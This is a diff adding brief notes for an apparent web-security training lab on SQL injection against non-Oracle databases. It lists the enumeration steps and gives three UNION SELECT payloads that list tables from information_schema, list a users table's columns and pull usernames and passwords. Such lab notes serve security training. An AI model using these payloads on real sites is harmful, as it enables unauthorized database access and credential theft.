@@ -1,0 +1,17 @@
+Lab #08: Listing the database contents on non-Oracle databases
+
+finding the number of column
+
+find the column containing the text
+
+find the version (type)of database
+
+Find all the columns in tha database
+' union select table_name%2CNULL from information_schema.tables--
+
+Finding all the columns in the table users_tagpxx
+' union SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users_tagpxx'--
+
+Retrieving the content of columns (password_htfnlt and username_hrycyv)
+' union SELECT username_hrycyv,password_htfnlt FROM users_tagpxx--
+
